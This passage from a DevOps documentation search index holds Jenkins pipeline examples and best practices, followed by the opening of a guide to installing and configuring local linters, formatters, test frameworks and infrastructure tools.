}\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#stashunstash-for-artifact-sharing","title":"Stash/Unstash for Artifact Sharing","text":"<pre><code>stage('Build') {\n    steps {\n        sh 'npm run build'\n        stash name: 'dist', includes: 'dist/**'\n    }\n}\n\nstage('Test') {\n    parallel {\n        stage('Unit Tests') {\n            agent {\n                label 'test-runner-1'\n            }\n            steps {\n                unstash 'dist'\n                sh 'npm test'\n            }\n        }\n\n        stage('Integration Tests') {\n            agent {\n                label 'test-runner-2'\n            }\n            steps {\n                unstash 'dist'\n                sh 'npm run test:integration'\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#workspace-cleanup","title":"Workspace Cleanup","text":"<pre><code>options {\n    skipDefaultCheckout()  // Don't checkout automatically\n    buildDiscarder(logRotator(numToKeepStr: '10'))\n}\n\nstages {\n    stage('Cleanup Workspace') {\n        steps {\n            cleanWs()\n        }\n    }\n\n    stage('Checkout') {\n        steps {\n            checkout scm\n        }\n    }\n}\n\npost {\n    always {\n        cleanWs(deleteDirs: true, patterns: [\n            [pattern: 'node_modules', type: 'INCLUDE'],\n            [pattern: '.venv', type: 'INCLUDE'],\n            [pattern: '**/*.pyc', type: 'INCLUDE']\n        ])\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#multi-branch-pipelines","title":"Multi-Branch Pipelines","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#branch-based-configuration","title":"Branch-Based Configuration","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        DEPLOY_ENV = \"${getBranchEnvironment()}\"\n        AWS_REGION = 'us-east-1'\n    }\n\n    stages {\n        stage('Environment Info') {\n            steps {\n                echo \"Branch: ${env.BRANCH_NAME}\"\n                echo \"Deploy Environment: ${env.DEPLOY_ENV}\"\n            }\n        }\n\n        stage('Build') {\n            steps {\n                sh 'npm ci &amp;&amp; npm run build'\n            }\n        }\n\n        stage('Test') {\n            when {\n                not { branch 'main' }\n            }\n            steps {\n                sh 'npm test'\n            }\n        }\n\n        stage('Deploy') {\n            when {\n                anyOf {\n                    branch 'main'\n                    branch 'develop'\n                    branch 'staging'\n                }\n            }\n            steps {\n                script {\n                    def config = getDeployConfig(env.DEPLOY_ENV)\n\n                    sh \"\"\"\n                        aws s3 sync ./dist s3://${config.bucket}/ \\\\\n                            --region ${AWS_REGION} \\\\\n                            --delete\n\n                        aws cloudfront create-invalidation \\\\\n                            --distribution-id ${config.distributionId} \\\\\n                            --paths '/*'\n                    \"\"\"\n                }\n            }\n        }\n    }\n}\n\ndef getBranchEnvironment() {\n    switch(env.BRANCH_NAME) {\n        case 'main':\n            return 'production'\n        case 'staging':\n            return 'staging'\n        case 'develop':\n            return 'development'\n        default:\n            return 'feature'\n    }\n}\n\ndef getDeployConfig(environment) {\n    def configs = [\n        production: [\n            bucket: 'myapp-prod',\n            distributionId: 'E1234567890ABC'\n        ],\n        staging: [\n            bucket: 'myapp-staging',\n            distributionId: 'E0987654321XYZ'\n        ],\n        development: [\n            bucket: 'myapp-dev',\n            distributionId: 'E1111111111AAA'\n        ]\n    ]\n\n    return configs[environment]\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#pull-request-validation","title":"Pull Request Validation","text":"<pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('PR Validation') {\n            when {\n                changeRequest()\n            }\n            steps {\n                script {\n                    echo \"Validating PR #${env.CHANGE_ID}\"\n                    echo \"Target Branch: ${env.CHANGE_TARGET}\"\n                    echo \"Source Branch: ${env.CHANGE_BRANCH}\"\n\n                    // Run comprehensive validation for PRs\n                    sh '''\n                        npm ci\n                        npm run lint\n                        npm run format:check\n                        npm test -- --coverage\n                        npm run build\n                    '''\n                }\n            }\n        }\n\n        stage('Update PR Status') {\n            when {\n                changeRequest()\n            }\n            steps {\n                script {\n                    if (currentBuild.result == 'SUCCESS' || currentBuild.result == null) {\n                        githubNotify(\n                            status: 'SUCCESS',\n                            context: 'continuous-integration/jenkins/pr-merge',\n                            description: 'All checks passed'\n                        )\n                    } else {\n                        githubNotify(\n                            status: 'FAILURE',\n                            context: 'continuous-integration/jenkins/pr-merge',\n                            description: 'Some checks failed'\n                        )\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#advanced-patterns","title":"Advanced Patterns","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#dynamic-pipeline-generation","title":"Dynamic Pipeline Generation","text":"<pre><code>def services = ['frontend', 'backend', 'api-gateway']\n\npipeline {\n    agent any\n\n    stages {\n        stage('Build All Services') {\n            steps {\n                script {\n                    def buildStages = [:]\n\n                    services.each { service -&gt;\n                        buildStages[service] = {\n                            stage(\"Build ${service}\") {\n                                docker.build(\"${DOCKER_REGISTRY}/${service}:${GIT_COMMIT}\", \"./${service}\")\n                            }\n                        }\n                    }\n\n                    parallel buildStages\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#scripted-pipeline-with-advanced-logic","title":"Scripted Pipeline with Advanced Logic","text":"<pre><code>node {\n    def dockerImage\n    def imageTag = \"${env.BUILD_NUMBER}-${env.GIT_COMMIT.take(7)}\"\n\n    try {\n        stage('Checkout') {\n            checkout scm\n        }\n\n        stage('Determine Changes') {\n            def changedFiles = sh(\n                script: 'git diff --name-only HEAD~1',\n                returnStdout: true\n            ).trim().split('\\n')\n\n            env.FRONTEND_CHANGED = changedFiles.any { it.startsWith('frontend/') }\n            env.BACKEND_CHANGED = changedFiles.any { it.startsWith('backend/') }\n\n            echo \"Frontend changed: ${env.FRONTEND_CHANGED}\"\n            echo \"Backend changed: ${env.BACKEND_CHANGED}\"\n        }\n\n        if (env.FRONTEND_CHANGED == 'true') {\n            stage('Frontend Build') {\n                dir('frontend') {\n                    sh 'npm ci &amp;&amp; npm run build'\n                }\n            }\n\n            stage('Frontend Docker Build') {\n                dockerImage = docker.build(\n                    \"${DOCKER_REGISTRY}/frontend:${imageTag}\",\n                    \"./frontend\"\n                )\n            }\n        }\n\n        if (env.BACKEND_CHANGED == 'true') {\n            stage('Backend Build') {\n                dir('backend') {\n                    sh 'pip install -e .'\n                    sh 'pytest tests/'\n                }\n            }\n\n            stage('Backend Docker Build') {\n                dockerImage = docker.build(\n                    \"${DOCKER_REGISTRY}/backend:${imageTag}\",\n                    \"./backend\"\n                )\n            }\n        }\n\n        if (env.FRONTEND_CHANGED == 'true' || env.BACKEND_CHANGED == 'true') {\n            stage('Push Images') {\n                docker.withRegistry('https://registry.hub.docker.com', 'docker-hub-credentials') {\n                    dockerImage.push()\n                    dockerImage.push('latest')\n                }\n            }\n        } else {\n            echo \"No relevant changes detected, skipping build\"\n        }\n\n    } catch (Exception e) {\n        currentBuild.result = 'FAILURE'\n        throw e\n    } finally {\n        stage('Cleanup') {\n            cleanWs()\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#retry-and-timeout-strategies","title":"Retry and Timeout Strategies","text":"<pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Flaky Integration Test') {\n            steps {\n                retry(3) {\n                    timeout(time: 5, unit: 'MINUTES') {\n                        sh './run-integration-tests.sh'\n                    }\n                }\n            }\n        }\n\n        stage('Deploy with Retry') {\n            steps {\n                script {\n                    def maxRetries = 3\n                    def retryDelay = 30  // seconds\n\n                    for (int i = 1; i &lt;= maxRetries; i++) {\n                        try {\n                            timeout(time: 10, unit: 'MINUTES') {\n                                sh './deploy.sh'\n                            }\n                            break\n                        } catch (Exception e) {\n                            if (i == maxRetries) {\n                                throw e\n                            }\n                            echo \"Deploy failed (attempt ${i}/${maxRetries}), retrying in ${retryDelay} seconds...\"\n                            sleep retryDelay\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#feature-flag-integration","title":"Feature Flag Integration","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        LAUNCH_DARKLY_KEY = credentials('launchdarkly-sdk-key')\n    }\n\n    stages {\n        stage('Check Feature Flags') {\n            steps {\n                script {\n                    def featureEnabled = sh(\n                        script: \"\"\"\n                            curl -s -X GET \"https://app.launchdarkly.com/api/v2/flags/default/canary-deployment\" \\\\\n                                -H \"Authorization: ${LAUNCH_DARKLY_KEY}\" \\\\\n                                | jq -r '.environments.production.on'\n                        \"\"\",\n                        returnStdout: true\n                    ).trim()\n\n                    env.CANARY_ENABLED = featureEnabled\n                    echo \"Canary deployment enabled: ${env.CANARY_ENABLED}\"\n                }\n            }\n        }\n\n        stage('Deploy') {\n            steps {\n                script {\n                    if (env.CANARY_ENABLED == 'true') {\n                        echo \"Using canary deployment strategy\"\n                        sh './deploy-canary.sh'\n                    } else {\n                        echo \"Using standard deployment strategy\"\n                        sh './deploy-standard.sh'\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#best-practices-summary","title":"Best Practices Summary","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#pipeline-structure","title":"Pipeline Structure","text":"<ol> <li>Use Declarative Syntax: Unless you need complex scripting logic</li> <li>Define Agent Per Stage: More flexible resource allocation</li> <li>Implement Timeouts: Prevent resource exhaustion</li> <li>Use Parallel Execution: Speed up builds</li> <li>Cleanup Workspaces: Prevent disk space issues</li> </ol>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#security","title":"Security","text":"<ol> <li>Never Hardcode Secrets: Always use Jenkins credentials</li> <li>Use Credential Scoping: Limit credential access by folder/job</li> <li>Scan Dependencies: Integrate Snyk, Trivy, or similar tools</li> <li>Implement RBAC: Use Jenkins role-based access control</li> <li>Audit Logs: Enable and monitor Jenkins audit logs</li> </ol>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#performance","title":"Performance","text":"<ol> <li>Cache Dependencies: Use stash/unstash or external caching</li> <li>Optimize Docker Builds: Multi-stage builds, layer caching</li> <li>Limit Concurrent Builds: Prevent resource contention</li> <li>Clean Old Builds: Use build discarder</li> <li>Monitor Build Times: Track and optimize slow stages</li> </ol>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#testing","title":"Testing","text":"<ol> <li>Run Tests in Parallel: Speed up feedback loop</li> <li>Fail Fast: Run quick tests first</li> <li>Publish Test Results: Use JUnit plugin for visibility</li> <li>Track Coverage: Publish coverage reports</li> <li>Separate Test Types: Unit, integration, E2E in different stages</li> </ol>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#deployment","title":"Deployment","text":"<ol> <li>Use Blue-Green or Canary: Minimize downtime and risk</li> <li>Implement Health Checks: Verify deployments before traffic switch</li> <li>Enable Rollback: Automate rollback on failure</li> <li>Manual Approval for Prod: Use input step for production deployments</li> <li>Notify on Deployment: Slack, email, or other notifications</li> </ol>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#resources","title":"Resources","text":"<ul> <li>Jenkins Pipeline Documentation</li> <li>Declarative Pipeline Syntax</li> <li>Jenkins Shared Libraries</li> <li>Pipeline Best Practices</li> <li>Jenkins Plugins Index</li> </ul> <p>Next Steps:</p> <ul> <li>Review the GitHub Actions Guide for alternative CI/CD platform</li> <li>See GitLab CI Guide for GitLab-specific patterns</li> <li>Check AI Validation Pipeline for AI-powered code review</li> </ul>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/local_validation_setup/","title":"Local Validation Setup Guide","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#introduction","title":"Introduction","text":"<p>This guide provides step-by-step instructions for setting up a complete local development environment with all validation tools, linters, formatters, and testing frameworks. By configuring these tools locally, you can catch issues before committing code and maintain consistency with CI/CD pipelines.</p>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Prerequisites</li> <li>Package Managers</li> <li>Python Development</li> <li>JavaScript/TypeScript Development</li> <li>Infrastructure as Code</li> <li>Shell Script Development</li> <li>Container Development</li> <li>Database Development</li> <li>Editor Integration</li> <li>Validation Scripts</li> <li>Troubleshooting</li> </ol>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#prerequisites","title":"Prerequisites","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#operating-system-setup","title":"Operating System Setup","text":"<p>macOS:</p> <pre><code>## Install Xcode Command Line Tools\nxcode-select --install\n\n## Install Homebrew\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n</code></pre> <p>Ubuntu/Debian:</p> <pre><code>## Update package list\nsudo apt update\n\n## Install build essentials\nsudo apt install -y build-essential curl git wget\n\n## Install common utilities\nsudo apt install -y ca-certificates gnupg lsb-release\n</code></pre> <p>Fedora/RHEL:</p> <pre><code>## Install development tools\nsudo dnf groupinstall \"Development Tools\"\n\n## Install utilities\nsudo dnf install -y curl git wget\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#git-configuration","title":"Git Configuration","text":"<pre><code>## Set user information\ngit config --global user.name \"Your Name\"\ngit config --global user.email \"your.email@example.com\"\n\n## Set default branch name\ngit config --global init.defaultBranch main\n\n## Enable credential caching\ngit config --global credential.helper cache\n\n## Set line ending handling\ngit config --global core.autocrlf input  # macOS/Linux\n## git config --global core.autocrlf true  # Windows\n\n## Enable color output\ngit config --global color.ui auto\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#package-managers","title":"Package Managers","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#python-package-management","title":"Python Package Management","text":"<p>Install uv (recommended):</p> <pre><code>## macOS/Linux\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n\n## Verify installation\nuv --version\n</code></pre> <p>Alternative: pipx:</p> <pre><code>## macOS\nbrew install pipx\npipx ensurepath\n\n## Ubuntu/Debian\nsudo apt install pipx\npipx ensurepath\n\n## Verify\npipx --version\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#nodejs-package-management","title":"Node.js Package Management","text":"<p>Install Node.js via nvm:</p> <pre><code>## Install nvm\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash\n\n## Reload shell\nsource ~/.bashrc  # or ~/.zshrc\n\n## Install LTS version\nnvm install --lts\n\n## Set as default\nnvm use --lts\nnvm alias default node\n\n## Verify\nnode --version\nnpm --version\n</code></pre> <p>Enable pnpm (optional, faster alternative):</p> <pre><code>## Enable with corepack (Node.js 16.13+)\ncorepack enable\ncorepack prepare pnpm@latest --activate\n\n## Verify\npnpm --version\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#ruby-for-some-tools","title":"Ruby (for some tools)","text":"<p>Install rbenv:</p> <pre><code>## macOS\nbrew install rbenv ruby-build\n\n## Ubuntu/Debian\nsudo apt install rbenv\n\n## Initialize\nrbenv init\necho 'eval \"$(rbenv init -)\"' &gt;&gt; ~/.bashrc\n\n## Install Ruby\nrbenv install 3.2.2\nrbenv global 3.2.2\n\n## Verify\nruby --version\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#python-development","title":"Python Development","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#core-python-tools","title":"Core Python Tools","text":"<p>Install Python 3.11+ and tools:</p> <pre><code>## macOS\nbrew install python@3.11\n\n## Ubuntu/Debian (Python 3.11)\nsudo apt install -y python3.11 python3.11-venv python3.11-dev\n\n## Set as default (if needed)\nsudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.11 1\n</code></pre> <p>Create virtual environment:</p> <pre><code>## Using venv\npython3 -m venv .venv\nsource .venv/bin/activate  # macOS/Linux\n## .venv\\Scripts\\activate  # Windows\n\n## Using uv (faster)\nuv venv\nsource .venv/bin/activate\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#python-linting-and-formatting","title":"Python Linting and Formatting","text":"<p>Install tools globally with pipx:</p> <pre><code>## Black (formatter)\npipx install black\n\n## isort (import sorter)\npipx install isort\n\n## flake8 (linter)\npipx install flake8\npipx inject flake8 flake8-docstrings\npipx inject flake8 flake8-bugbear\npipx inject flake8 flake8-comprehensions\n\n## mypy (type checker)\npipx install mypy\n\n## bandit (security checker)\npipx install bandit\n\n## pylint (comprehensive linter)\npipx install pylint\n</code></pre> <p>Or install in project:</p> <pre><code>## Using uv\nuv pip install black isort flake8 mypy bandit pylint\n\n## Using pip\npip install black isort flake8 mypy bandit pylint\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#python-configuration-files","title":"Python Configuration Files","text":"<p>pyproject.toml:</p> <pre><code>[project]\nname = \"my-project\"\nversion = \"0.1.0\"\ndescription = \"Project description\"\nrequires-python = \"&gt;=3.11\"\ndependencies = []\n\n[project.optional-dependencies]\ndev = [\n    \"black&gt;=23.12.1\",\n    \"isort&gt;=5.13.2\",\n    \"flake8&gt;=7.0.0\",\n    \"mypy&gt;=1.8.0\",\n    \"bandit&gt;=1.7.6\",\n    \"pytest&gt;=7.4.3\",\n    \"pytest-cov&gt;=4.1.0\",\n]\n\n[tool.black]\nline-length = 120\ntarget-version = ['py311']\ninclude = '\\.pyi?$'\nextend-exclude = '''\n/(\n  # directories\n  \\.eggs\n  | \\.git\n  | \\.venv\n  | build\n  | dist\n)/\n'''\n\n[tool.isort]\nprofile = \"black\"\nline_length = 120\nskip_gitignore = true\nknown_first_party = [\"myproject\"]\n\n[tool.mypy]\npython_version = \"3.11\"\nwarn_return_any = true\nwarn_unused_configs = true\ndisallow_untyped_defs = true\nignore_missing_imports = true\n\n[tool.pytest.ini_options]\ntestpaths = [\"tests\"]\npython_files = \"test_*.py\"\npython_functions = \"test_*\"\naddopts = \"-v --cov=src --cov-report=html --cov-report=term\"\n\n[tool.coverage.run]\nsource = [\"src\"]\nomit = [\"*/tests/*\", \"*/__pycache__/*\"]\n\n[tool.coverage.report]\nexclude_lines = [\n    \"pragma: no cover\",\n    \"def __repr__\",\n    \"raise AssertionError\",\n    \"raise NotImplementedError\",\n    \"if __name__ == .__main__.:\",\n]\n</code></pre> <p>.flake8:</p> <pre><code>[flake8]\nmax-line-length = 120\nextend-ignore = E203, W503\nmax-complexity = 10\ndocstring-convention = google\nexclude =\n    .git,\n    __pycache__,\n    .venv,\n    build,\n    dist\nper-file-ignores =\n    __init__.py:F401\n    tests/*:D100,D101,D102,D103\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#python-testing","title":"Python Testing","text":"<p>Install pytest and plugins:</p> <pre><code>pipx install pytest\npipx inject pytest pytest-cov\npipx inject pytest pytest-mock\npipx inject pytest pytest-asyncio\npipx inject pytest pytest-xdist  # parallel testing\n</code></pre> <p>Run tests:</p> <pre><code>## Run all tests\npytest\n\n## Run with coverage\npytest --cov=src --cov-report=html\n\n## Run specific test file\npytest tests/test_example.py\n\n## Run with parallel execution\npytest -n auto\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#javascripttypescript-development","title":"JavaScript/TypeScript Development","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#nodejs-tooling","title":"Node.js Tooling","text":"<p>Install core tools:</p> <pre><code>## Using npm (globally)\nnpm install -g typescript\nnpm install -g ts-node\nnpm install -g prettier\nnpm install -g eslint\n\n## Or using pnpm\npnpm add -g typescript ts-node prettier eslint\n</code></pre> <p>Project setup:</p> <pre><code>## Initialize package.json\nnpm init -y\n\n## Install dev dependencies\nnpm install --save-dev \\\n  typescript \\\n  @types/node \\\n  eslint \\\n  @typescript-eslint/parser \\\n  @typescript-eslint/eslint-plugin \\\n  prettier \\\n  eslint-config-prettier \\\n  eslint-plugin-import\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#typescript-configuration","title":"TypeScript Configuration","text":"<p>tsconfig.json:</p> <pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"commonjs\",\n    \"lib\": [\"ES2022\"],\n    \"outDir\": \"./dist\",\n    \"rootDir\": \"./src\",\n    \"strict\": true,\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"resolveJsonModule\": true,\n    \"declaration\": true,\n    \"declarationMap\": true,\n    \"sourceMap\": true,\n    \"noUnusedLocals\": true,\n    \"noUnusedParameters\": true,\n    \"noImplicitReturns\": true,\n    \"noFallthroughCasesInSwitch\": true\n  },\n  \"include\": [\"src/**/*\"],\n  \"exclude\": [\"node_modules\", \"dist\", \"**/*.spec.ts\"]\n}\n</code></pre> <p>package.json scripts:</p> <pre><code>{\n  \"scripts\": {\n    \"build\": \"tsc\",\n    \"build:watch\": \"tsc --watch\",\n    \"lint\": \"eslint src/**/*.ts\",\n    \"lint:fix\": \"eslint src/**/*.ts --fix\",\n    \"format\": \"prettier --write \\\"src/**/*.{ts,tsx,js,jsx,json,md}\\\"\",\n    \"format:check\": \"prettier --check \\\"src/**/*.{ts,tsx,js,jsx,json,md}\\\"\",\n    \"type-check\": \"tsc --noEmit\",\n    \"test\": \"jest\",\n    \"test:watch\": \"jest --watch\",\n    \"test:coverage\": \"jest --coverage\"\n  }\n}\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#eslint-configuration","title":"ESLint Configuration","text":"<p>.eslintrc.json:</p> <pre><code>{\n  \"parser\": \"@typescript-eslint/parser\",\n  \"parserOptions\": {\n    \"ecmaVersion\": 2022,\n    \"sourceType\": \"module\",\n    \"project\": \"./tsconfig.json\"\n  },\n  \"extends\": [\n    \"eslint:recommended\",\n    \"plugin:@typescript-eslint/recommended\",\n    \"plugin:@typescript-eslint/recommended-requiring-type-checking\",\n    \"plugin:import/recommended\",\n    \"plugin:import/typescript\",\n    \"prettier\"\n  ],\n  \"plugins\": [\"@typescript-eslint\", \"import\"],\n  \"rules\": {\n    \"no-console\": \"warn\",\n    \"@typescript-eslint/no-explicit-any\": \"error\",\n    \"@typescript-eslint/explicit-function-return-type\": \"warn\",\n    \"import/order\": [\n      \"error\",\n      {\n        \"groups\": [\n          \"builtin\",\n          \"external\",\n          \"internal\",\n          \"parent\",\n          \"sibling\",\n          \"index\"\n        ],\n        \"newlines-between\": \"always\",\n        \"alphabetize\": {\n          \"order\": \"asc\"\n        }\n      }\n    ]\n  }\n}\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#prettier-configuration","title":"Prettier Configuration","text":"<p>.prettierrc.json:</p> <pre><code>{\n  \"semi\": true,\n  \"singleQuote\": true,\n  \"tabWidth\": 2,\n  \"trailingComma\": \"es5\",\n  \"printWidth\": 100,\n  \"arrowParens\": \"always\",\n  \"endOfLine\": \"lf\"\n}\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#javascripttypescript-testing","title":"JavaScript/TypeScript Testing","text":"<p>Install Jest:</p> <pre><code>npm install --save-dev \\\n  jest \\\n  @types/jest \\\n  ts-jest \\\n  @testing-library/jest-dom\n</code></pre> <p>jest.config.js:</p> <pre><code>module.exports = {\n  preset: 'ts-jest',\n  testEnvironment: 'node',\n  roots: ['&lt;rootDir&gt;/src', '&lt;rootDir&gt;/tests'],\n  testMatch: ['**/__tests__/**/*.ts', '**/?(*.)+(spec|test).ts'],\n  transform: {\n    '^.+\\\\.ts$': 'ts-jest',\n  },\n  collectCoverageFrom: [\n    'src/**/*.ts',\n    '!src/**/*.d.ts',\n    '!src/**/*.spec.ts',\n    '!src/**/*.test.ts',\n  ],\n  coverageThreshold: {\n    global: {\n      branches: 80,\n      functions: 80,\n      lines: 80,\n      statements: 80,\n    },\n  },\n};\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#infrastructure-as-code","title":"Infrastructure as Code","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#terraformterragrunt","title":"Terraform/Terragrunt","text":"<p>Install Terraform:</p> <pre><code>## macOS\nbrew tap hashicorp/tap\nbrew install hashicorp/tap/terraform\n\n## Ubuntu/Debian\nwget -O- https://apt.releases.hashicorp.com/gpg | \\\n  sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg\necho \"deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \\\n  https://apt.releases.hashicorp.com $(lsb_release -cs) main\" | \\\n  sudo tee /etc/apt/sources.list.d/hashicorp.list\nsudo apt update &amp;&amp; sudo apt install terraform\n\n## Verify\nterraform --version\n</code></pre> <p>Install Terragrunt:</p> <pre><code>## macOS\nbrew install terragrunt\n\n## Linux (direct download)\nTERRAGRUNT_VERSION=\"0.54.8\"\nwget https://github.com/gruntwork-io/terragrunt/releases/download/v${TERRAGRUNT_VERSION}/terragrunt_linux_amd64\nsudo mv terragrunt_linux_amd64 /usr/local/bin/terragrunt\nsudo chmod +x /usr/local/bin/terragrunt\n\n## Verify\nterragrunt --version\n</code></pre> <p>Install TFLint:</p> <pre><code>## macOS\nbrew install tflint\n\n## Ubuntu/Debian\ncurl -s https://raw.githubusercontent.com/terraform-linters/tflint/master/install_linux.sh | bash\n\n## Verify\ntflint --version\n</code></pre> <p>Install terraform-docs:</p> <pre><code>## macOS\nbrew install terraform-docs\n\n## Linux\ncurl -sSLo ./terraform-docs.tar.gz https://terraform-docs.io/dl/latest/terraform-docs-linux-amd64.tar.gz\ntar -xzf terraform-docs.tar.gz\nsudo mv terraform-docs /usr/local/bin/\nrm terraform-docs.tar.gz\n\n## Verify\nterraform-docs --version\n</code></pre> <p>Install Checkov:</p> <pre><code>## Using pipx\npipx install checkov\n\n## Verify\ncheckov --version\n</code></pre> <p>.tflint.hcl:</p> <pre><code>plugin \"aws\" {\n  enabled = true\n  version = \"0.29.0\"\n  source  = \"github.com/terraform-linters/tflint-ruleset-aws\"\n}\n\nrule \"terraform_naming_convention\" {\n  enabled = true\n}\n\nrule \"terraform_documented_variables\" {\n  enabled = true\n}\n\nrule \"terraform_module_pinned_source\" {\n  enabled = true\n}\n\nrule \"terraform_unused_declarations\" {\n  enabled = true\n}\n\nrule \"terraform_required_version\" {\n  enabled = true\n}\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#ansible","title":"Ansible","text":"<p>Install Ansible:</p> <pre><code>## macOS\nbrew install ansible\n\n## Ubuntu/Debian\nsudo apt update\nsudo apt install ansible\n\n## Using pipx (recommended)\npipx install ansible-core\npipx inject ansible-core ansible\n\n## Verify\nansible --version\n</code></pre> <p>Install ansible-lint:</p> <pre><code>## Using pipx\npipx install ansible-lint\n\n## Verify\nansible-lint --version\n</code></pre> <p>.ansible-lint:</p> <pre><code>profile: production\n\nexclude_paths:\n  - .cache/\n  - .github/\n  - test/\n  - molecule/\n\nskip_list:\n  - yaml[line-length]\n\nenable_list:\n  - args\n  - empty-string-compare\n  - no-log-password\n  - no-same-owner\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#kuberneteshelm","title":"Kubernetes/Helm","text":"<p>Install kubectl:</p> <pre><code>## macOS\nbrew install kubectl\n\n## Ubuntu/Debian\ncurl -LO \"https://dl.k8s.io/release/$(curl 